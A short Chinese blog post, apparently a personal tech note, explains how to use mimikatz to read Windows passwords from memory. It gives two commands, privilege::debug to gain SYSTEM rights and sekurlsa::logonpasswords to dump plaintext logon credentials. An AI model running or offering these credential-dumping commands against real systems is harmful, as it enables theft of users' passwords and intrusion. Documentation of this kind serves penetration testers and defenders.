---
title: 使用mimikatz读取windows密码
abbrlink: a80bd06b
cover: 'https://static.zahui.fan/images/windows.jpg'
categories:
  - Windows
tags:
  - bat
date: 2021-07-05 15:20:52
---

[github地址](https://github.com/gentilkiwi/mimikatz)

mimikatz 是一个小工具，可以查看到windows加载进内存的密码数据，首先最起码要使用Administrator权限启动

依次执行：

从administrator提升到system  

```bat
privilege::debug  
```

获取明文密码  

```bat
sekurlsa::logonpasswords
```
